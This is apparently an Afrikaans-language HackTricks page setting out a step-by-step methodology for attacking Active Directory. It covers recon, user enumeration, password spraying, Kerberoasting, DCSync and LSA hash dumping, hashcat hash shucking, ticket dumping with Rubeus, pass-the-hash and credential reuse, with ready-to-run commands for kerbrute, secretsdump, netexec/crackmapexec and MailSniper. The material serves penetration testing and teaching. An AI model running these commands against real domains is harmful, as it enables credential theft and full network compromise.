# Active Directory Metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as 'n grondliggende tegnologie wat netwerkadministrateurs in staat stel om doeltreffend **domains**, **users**, en **objects** binne 'n netwerk te skep en te bestuur. Dit is ontwerp om te skaal en maak dit moontlik om 'n groot aantal gebruikers in hanteerbare **groups** en **subgroups** te organiseer, terwyl **access rights** op verskeie vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie hooflae: **domains**, **trees**, en **forests**. 'n **Domain** sluit 'n versameling objecte in, soos **users** of **devices**, wat 'n gemeenskaplike databasis deel. **Trees** is groepe van hierdie domains wat deur 'n gedeelde struktuur verbind is, en 'n **forest** verteenwoordig die versameling van meerdere trees wat onderling deur **trust relationships** gekoppel is, wat die boonste laag van die organisasiestruktuur vorm. Spesifieke **access** en **communication rights** kan op elk van hierdie vlakke aangewys word.

Sleutelkonsepte binne **Active Directory** sluit in:

1. **Directory** – Berg alle inligting wat betrekking het op Active Directory-objecte.
2. **Object** – Verwys na entiteite binne die directory, insluitend **users**, **groups**, of **shared folders**.
3. **Domain** – Dien as 'n houer vir directory-objecte, met die vermoë vir meerdere domains om binne 'n **forest** te bestaan, elk met sy eie versameling objecte.
4. **Tree** – 'n Groepering van domains wat 'n gemeenskaplike root domain deel.
5. **Forest** – Die hoogste organisasievlak in Active Directory, saamgestel uit verskeie trees met **trust relationships** tussen hulle.

**Active Directory Domain Services (AD DS)** sluit 'n reeks dienste in wat kritiek is vir die gesentraliseerde bestuur en kommunikasie binne 'n netwerk. Hierdie dienste sluit in:

1. **Domain Services** – Sentrale stoorplek vir data en bestuur van interaksies tussen **users** en **domains**, insluitend **authentication** en **search** funksionaliteit.
2. **Certificate Services** – Beheer die skep, verspreiding en bestuur van veilige **digital certificates**.
3. **Lightweight Directory Services** – Ondersteun directory-enabled toepassings deur die **LDAP protocol**.
4. **Directory Federation Services** – Verskaf **single-sign-on** vermoëns om gebruikers oor meerdere webtoepassings in een sessie te autentiseer.
5. **Rights Management** – Help om kopieregbeskermde materiaal te beskerm deur ongeskeduleerde verspreiding en gebruik te beheer.
6. **DNS Service** – Krities vir die resolusie van **domain names**.

Vir 'n meer gedetailleerde verduideliking, sien: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Om te leer hoe om 'n AD aan te val, moet jy die **Kerberos authentication process** baie goed verstaan.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Spiekbrief

Jy kan [https://wadcoms.github.io/](https://wadcoms.github.io) besoek vir 'n vinnige oorsig van watter opdragte jy kan gebruik om 'n AD te enumerate/exploit.

> [!WARNING]
> Kerberos communication **requires a full qualified name (FQDN)** vir die uitvoering van aksies. As jy probeer om toegang tot 'n masjien te kry via die IP-adres, **sal dit NTLM gebruik en nie Kerberos nie**.

## Recon Active Directory (No creds/sessions)

As jy net toegang het tot 'n AD-omgewing maar jy het geen credentials/sessions nie, kan jy:

- **Pentest the network:**
- Scan die netwerk, vind masjiene en oop poorte en probeer **exploit vulnerabilities** of **extract credentials** daarvan (byvoorbeeld, [printers could be very interesting targets](ad-information-in-printers.md)).
- Die enumerering van DNS kan inligting gee oor sleutelbedieners in die domain soos web, printers, shares, vpn, media, ens.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Neem 'n kyk by die Algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Check for null and Guest access on smb services** (dit sal nie op moderne Windows weergawes werk nie):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 'n Meer gedetailleerde gids oor hoe om 'n SMB-bediener te enumereer kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 'n Meer gedetailleerde gids oor hoe om LDAP te enumereer kan hier gevind word (gee **spesiale aandag aan anonymous access**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Versamel credentials deur [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Verkry toegang tot 'n gasheer deur [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Versamel credentials deur **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Ekstraheer gebruikersname/names uit interne dokumente, sosiale media, dienste (hoofsaaklik web) binne die domain-omgewings en ook van die publiek beskikbare bronne.
- As jy die volledige name van maatskappywerkers vind, kan jy verskillende AD **username conventions** probeer ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Die algemeenste konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters van elkeen), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _random letters and 3 random numbers_ (abc123).
- Tools:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) bladsye.
- **Kerbrute enum**: Wanneer 'n **invalid username is requested** sal die bediener reageer met die **Kerberos error** kode _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons toelaat om te bepaal dat die gebruikersnaam ongeldig was. **Valid usernames** sal óf 'n **TGT in a AS-REP** reaksie óf die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_ ontlok, wat aandui dat die gebruiker vereis word om pre-authentication te doen.
- **No Authentication against MS-NRPC**: Gebruik auth-level = 1 (No authentication) teen die MS-NRPC (Netlogon) koppelvlak op domain controllers. Die metode roep die `DsrGetDcNameEx2` funksie nadat die MS-NRPC koppelvlak gebind is om te kontroleer of die gebruiker of rekenaar bestaan sonder enige credentials. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) hulpmiddel implementeer hierdie soort enumerasie. Die navorsing kan hier gevind word [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

As jy een van hierdie servers in die netwerk gevind het, kan jy ook **user enumeration against it** uitvoer. Byvoorbeeld kan jy die tool [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Jy kan lyste van gebruikersname vind in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Echter, jy behoort die **naam van die mense wat by die maatskappy werk** te hê van die recon-stap wat jy voorheen moes uitgevoer het. Met die voor- en vannaam kan jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om moontlike geldige gebruikersname te genereer.

### Knowing one or several usernames

Ok, dus jy weet jy het reeds 'n geldige gebruikersnaam maar geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As 'n gebruiker **nie die attribuut _DONT_REQ_PREAUTH_ het nie** kan jy 'n **AS_REP message** vir daardie gebruiker versoek wat sekere data sal bevat wat met 'n afleiding van die gebruiker se wagwoord versleutel is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die mees **algemene wagwoorde** met elk van die ontdekte gebruikers, dalk gebruik 'n gebruiker 'n swak wagwoord (hou die wagwoordbeleid in gedagte!).
- Let wel dat jy ook **spray OWA servers** om te probeer toegang te kry tot die gebruikers se mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy mag dalk in staat wees om sekere challenge **hashes** te verkry om sekere protokolle van die **network** te poison:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

As jy daarin geslaag het om die Active Directory te enumereer sal jy **meer e-posadresse en 'n beter begrip van die network** hê. Jy mag in staat wees om NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) af te dwing om toegang tot die AD env te kry.

### NetExec workspace-driven recon & relay posture checks

- Gebruik **`nxcdb` workspaces** om AD recon state per engagement te bewaar: `workspace create <name>` skep per-protokol SQLite DBs onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Skakel views met `proto smb|mssql|winrm` en lys versamelde secrets met `creds`. Vee sensitiewe data handmatig uit wanneer klaar: `rm -rf ~/.nxc/workspaces/<name>`.
- Vinnige subnet-ontdekking met **`netexec smb <cidr>`** toon **domain**, **OS build**, **SMB signing requirements**, en **Null Auth**. Lede wat `(signing:False)` wys is **relay-prone**, terwyl DCs dikwels signing vereis.
- Genereer **hostnames in /etc/hosts** direk vanaf NetExec-uitset om targeting te vergemaklik:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Wanneer **SMB relay to the DC is blocked** deur signing, ondersoek steeds die **LDAP** houding: `netexec ldap <dc>` beklemtoon `(signing:None)` / weak channel binding. 'n DC met SMB signing required maar LDAP signing disabled bly 'n lewensvatbare **relay-to-LDAP** teiken vir misbruik soos **SPN-less RBCD**.

### Kliëntkant printer credential leaks → massa domein credential-validasie

- Printer/web UIs soms **embed masked admin passwords in HTML**. Bronweergave/devtools kan die duidelike teks openbaar (bv., `<input value="<password>">`), wat Basic-auth toegang tot scan/print repositories moontlik maak.
- Afgehaalde druktake kan **plaintext onboarding docs** bevat met per-gebruiker wagwoorde. Hou koppelings gesinkroniseer tydens toetsing:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Steel NTLM Creds

As jy toegang het tot **ander rekenaars of shares** met die **null- of guest-gebruiker** kan jy **lêers plaas** (soos 'n SCF-lêer) wat, indien dit op een of ander manier geopen word, 'n **NTLM-verifikasie teen jou in gang sal sit** sodat jy die **NTLM-uitdaging** kan **steel** om dit te kraak:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash wat jy reeds besit as 'n kandidaat-wagwoord vir ander, stadiger formate waarvan die sleutelmateriaal direk uit die NT-hash afgelei is. In plaas daarvan om lang passphrases in Kerberos RC4-tickets, NetNTLM-uitdagings, of gecachte credentials te brute-force, voed jy die NT-hashes in Hashcat’s NT-candidate-modusse en laat dit wagwoordhergebruik valideer sonder om ooit die plaintext te leer. Dit is veral kragtig na 'n domeinkompromie waar jy duisende huidige en historiese NT-hashes kan insamel.

Gebruik shucking wanneer:

- Jy het 'n NT-korpus vanaf DCSync, SAM/SECURITY dumps, of credential vaults en moet toets vir hergebruik in ander domeine/foreste.
- Jy vang RC4-gebaseerde Kerberos-materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM responses, of DCC/DCC2 blobs.
- Jy wil vinnig bewys dat daar hergebruik is vir lang, onkraakbare passphrases en onmiddellik pivot via Pass-the-Hash.

Die tegniek **werk nie** teen enkripsietipes wie se sleutels nie die NT-hash is nie (bv. Kerberos etype 17/18 AES). As 'n domein AES-only afdwing, moet jy terugval op die gewone wagwoordmodusse.

#### Building an NT hash corpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met history om die grootst moontlike stel NT-hashes (en hul vorige waardes) te kry:

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

History-inskrywings verbreed die kandidaatpoel aansienlik omdat Microsoft tot 24 vorige hashes per rekening kan stoor. Vir meer maniere om NTDS-sekrete te oes, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) onttrek plaaslike SAM/SECURITY-data en gecachte domein-aanmeldings (DCC/DCC2). Dedupliceer en voeg daardie hashes by dieselfde `nt_candidates.txt`-lys.
- **Hou metadata by** – Bewaar die gebruikersnaam/domein wat elke hash geproduseer het (selfs as die woordlys slegs heks bevat). Gekoppelde hashes vertel jou onmiddellik watter principal 'n wagwoord hergebruik het sodra Hashcat die wenkandidaat druk.
- Verkies kandidate van dieselfde forest of 'n vertroude forest; dit maksimeer die kans op oorvleueling wanneer jy shuck.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Aantekeninge:

- NT-candidate inputs **moet rou 32-hex NT-hashes bly**. Skakel rule engines af (geen `-r`, geen hybrid modes nie) omdat mangling die kandidaat-sleutelmateriaal bederf.
- Hierdie modusse is nie noodwendig vinniger nie, maar die NTLM-sleutelruimte (~30,000 MH/s op 'n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om 'n gekuratoreerde NT-lys te toets is baie goedkoper as om die hele wagwoordruimte in die stadiger formaat te verken.
- Hardloop altyd die **nuutste Hashcat build** (`git clone https://github.com/hashcat/hashcat && make install`) omdat modusse 31500/31600/35300/35400 onlangs bygekom het.
- Daar is tans geen NT-mode vir AS-REQ Pre-Auth nie, en AES-etypes (19600/19700) benodig die plaintext-wagwoord omdat hul sleutels via PBKDF2 vanaf UTF-16LE-wagwoorde afgelei word, nie rou NT-hashes nie.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat deriveer die RC4-sleutel uit elke NT-kandidaat en valideer die `$krb5tgs$23$...` blob. 'n Wedstryd bevestig dat die service account een van jou bestaande NT-hashes gebruik.

3. Immediately pivot via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Jy kan opsioneel later die plaintext herstel met `hashcat -m 1000 <matched_hash> wordlists/` indien nodig.

#### Example – Cached credentials (mode 31600)

1. Dump cached logons from a compromised workstation:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copy the DCC2 line for the interesting domain user into `dcc2_highpriv.txt` and shuck it:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 'n Suksesvolle wedstryd lewer die NT-hash wat reeds in jou lys bekend is, wat bewys dat die gecachte gebruiker 'n wagwoord hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in vinnige NTLM-mode om die string te herstel.

Dieselfde workflow geld vir NetNTLM challenge-responses (`-m 27000/27100`) en DCC (`-m 31500`). Sodra 'n wedstryd geïdentifiseer is, kan jy relay, SMB/WMI/WinRM PtH lanceer, of die NT-hash weer offline kraak met masks/rules.

## Enumerating Active Directory WITH credentials/session

Vir hierdie fase moet jy die **credentials of 'n sessie van 'n geldige domeinrekening gekompromitteer** hê. As jy enige geldige credentials of 'n shell as 'n domeingebruiker het, **moet jy onthou dat die opsies wat voorheen genoem is steeds opsies is om ander gebruikers te kompromitteer**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Om 'n rekening te kompromitteer is 'n **groot stap om te begin om die hele domein te kompromitteer**, want jy gaan in staat wees om die **Active Directory Enumeration** te begin:

Wat [**ASREPRoast**](asreproast.md) betref kan jy nou elke moontlike kwesbare gebruiker vind, en wat [**Password Spraying**](password-spraying.md) betref kan jy 'n **lys van alle gebruikersname** kry en probeer die wagwoord van die gekompromitteerde rekening, leë wagwoorde en nuwe belowende wagwoorde.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

Dit is baie maklik om alle domeingebruikersname te bekom vanaf Windows (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerering-afdeling klein, dit is die belangrikste deel van alles. Toegang die skakels (hoofsaaklik dié van cmd, powershell, powerview en BloodHound), leer hoe om 'n domein te ontleed en oefen totdat jy gemaklik voel. Tydens 'n assessering sal dit die sleutel oomblik wees om jou pad na DA te vind of om te besluit dat niks gedoen kan word nie.

### Kerberoast

Kerberoasting behels die verkryging van **TGS tickets** wat deur dienste wat aan gebruikersrekeninge gekoppel is gebruik word en die kraking van hul enkripsie — wat gebaseer is op gebruikerswagwoorde — **offline**.

More about this in:

{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Sodra jy sekere credentials bekom het kan jy kyk of jy toegang tot enige **masjien** het. Hiervoor kan jy **CrackMapExec** gebruik om te probeer verbind met verskeie bedieners oor verskillende protokolle, volgens jou port-scans.

### Local Privilege Escalation

As jy credentials of 'n sessie as 'n gewone domeingebruiker gekompromitteer het en jy het **toegang** met hierdie gebruiker tot **enige masjien in die domein**, moet jy probeer om plaaslike privilège te eskaleer en te loot vir credentials. Dit is omdat slegs met plaaslike administrateurprivileges jy die hashes van ander gebruikers in geheue (LSASS) en plaaslik (SAM) kan dump.

Daar is 'n volledige bladsy in hierdie boek oor [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) en 'n [**checklist**](../checklist-windows-privilege-escalation.md). Moet ook nie vergeet om [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) te gebruik nie.

### Current Session Tickets

Dit is baie **onwaarskynlik** dat jy **tickets** in die huidige gebruiker sal vind wat jou toestemming gee om toegang te kry tot onverwagte hulpbronne, maar jy kan dit nagaan:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

As jy daarin geslaag het om die active directory te enumereer sal jy **meer e-posadresse en 'n beter begrip van die netwerk** hê. Jy mag in staat wees om NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Soek na Creds in Computer Shares | SMB Shares

Nou dat jy 'n paar basiese credentials het, moet jy kyk of jy enige **interessante lêers wat binne die AD gedeel word** kan **vind**. Jy kan dit handmatig doen, maar dit is 'n baie vervelige, herhalende taak (veral as jy honderde dokumente vind wat jy moet nagaan).

[**Volg hierdie skakel om te leer oor gereedskap wat jy kan gebruik.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

As jy toegang tot ander PCs of shares kan kry, kan jy **lêers plaas** (soos 'n SCF file) wat, indien op een of ander manier oopgemaak word, 'n **NTLM authentication teen jou sal trigger**, sodat jy die **NTLM challenge** kan **steel** om dit te kraak:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Hierdie kwesbaarheid het enige geauthentiseerde gebruiker toegelaat om die **domain controller te kompromitteer**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Vir die volgende tegnieke is 'n gewone domain user nie genoeg nie; jy het spesiale privileges/credentials nodig om hierdie aanvalle uit te voer.**

### Hash extraction

Hopelik het jy daarin geslaag om 'n **local admin** rekening te kompromitteer met behulp van [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Dan is dit tyd om al die hashes in geheue en lokaal te dump.\
[**Lees hierdie bladsy oor verskeie maniere om die hashes te verkry.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Sodra jy die hash van 'n gebruiker het**, kan jy dit gebruik om as daardie gebruiker op te tree.\
Jy moet 'n **tool** gebruik wat die **NTLM authentication met** daardie **hash** sal **uitvoer**, **of** jy kan 'n nuwe **sessionlogon** skep en daardie **hash** in **LSASS** **inject**, sodat wanneer enige **NTLM authentication** uitgevoer word, daardie **hash** gebruik sal word. Die laaste opsie is wat mimikatz doen.\
[**Lees hierdie bladsy vir meer inligting.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Hierdie aanval poog om die **gebruikers NTLM hash te gebruik om Kerberos tickets aan te vra**, as 'n alternatief vir die algemene Pass The Hash oor die NTLM protocol. Daarom kan dit veral **nuttig wees in netwerke waar NTLM protocol gedeaktiveer is** en slegs **Kerberos as authentication protocol toegelaat word**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

In die **Pass The Ticket (PTT)** aanvalsmethode steel aanvalleerders **'n gebruiker se authentication ticket** in plaas van hulle wagwoord of hash-waardes. Hierdie gesteelde ticket word dan gebruik om as die gebruiker op te tree, en om ongeoorloofde toegang tot hulpbronne en dienste binne 'n netwerk te verkry.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

As jy die **hash** of **password** van 'n **local administrator** het, moet jy probeer om daarmee lokaal aan te meld by ander **PCs**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Let daarop dat dit redelik **luidrugtig** is en **LAPS** dit **sal verlig**.

### MSSQL-misbruik & vertroude skakels

As 'n gebruiker voorregte het om **MSSQL instances te toegang**, kan hy dit gebruik om **opdragte uit te voer** op die MSSQL-gasheer (as dit as SA loop), die NetNTLM **hash** te **steel** of selfs 'n **relay** **attack** uit te voer.\
Ook, as 'n MSSQL-instance deur 'n ander MSSQL-instance vertrou word (database link). As die gebruiker voorregte oor die vertroude databasis het, sal hy die **vertrouensverhouding kan gebruik om ook vrae in die ander instance uit te voer**. Hierdie vertroue kan gekoppel word en op 'n stadium kan die gebruiker 'n verkeerd ge- skonfigureerde databasis vind waar hy opdragte kan uitvoer.\
**Die skakels tussen databasisse werk selfs oor forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms misbruik

Derdeparty inventaris- en deployment-suites maak dikwels kragtige paaie na credentials en code-execution beskikbaar. Sien:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

As jy enige Computer-object met die attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) vind en jy het domein-voorregte op die rekenaar, sal jy TGTs uit die geheue van elke gebruiker wat op die rekenaar aanmeld, kan dump.\
Dus, as 'n **Domain Admin aanmeld op die rekenaar**, sal jy sy TGT kan dump en hom kan impersonate met behulp van [Pass the Ticket](pass-the-ticket.md).\
Danksy constrained delegation kan jy selfs **outomaties 'n Print Server kompromitteer** (hooplik sal dit 'n DC wees).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

As 'n gebruiker of rekenaar vir "Constrained Delegation" toegelaat is, sal dit in staat wees om **enige gebruiker te impersonate om toegang tot sekere dienste op 'n rekenaar te kry**.\
Dan, as jy die **hash van hierdie gebruiker/rekenaar kompromitteer**, sal jy **enige gebruiker** (selfs domain admins) kan impersonate om toegang tot sommige dienste te kry.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resource-based Constrained Delegation

Om **WRITE**-voorregte op 'n Active Directory-object van 'n remote rekenaar te hê, maak dit moontlik om code-execution met **verhoogde voorregte** te verkry:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs-misbruik

Die gekompromitteerde gebruiker kan sommige **interessante voorregte oor sekere domein-objects** hê wat jou toelaat om lateraal te **beweeg**/**voorregte op te skerp**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service misbruik

Om 'n **Spool service wat luister** binne die domein te ontdek, kan **misbruik** word om **nuwe credentials te bekom** en **voorregte op te skerp**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Derdeparty sessies misbruik

As **ander gebruikers** die **gekompromitteerde** masjien **toegang** het, is dit moontlik om **credentials uit die geheue te versamel** en selfs **beacons in hul prosesse in te spuit** om hulle te impersonate.\
Gewoonlik sal gebruikers via RDP by die stelsel aanknoop, so hier is hoe om 'n paar aanvalle oor derdeparty RDP-sessies uit te voer:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bied 'n stelsel vir die bestuur van die **lokale Administrator-wagwoord** op domain-joined rekenaars, wat verseker dat dit **gerandomiseer**, uniek en gereeld **verander** is. Hierdie wagwoorde word in Active Directory gestoor en toegang word deur ACLs slegs aan gemagtigde gebruikers beheer. Met voldoende toestemmings om hierdie wagwoorde te lees, word pivoterings na ander rekenaars moontlik.


{{#ref}}
laps.md
{{#endref}}

### Sertifikaatdiefstal

**Sertifikate insamel** op die gekompromitteerde masjien kan 'n manier wees om voorregte binne die omgewing te eskaleer:

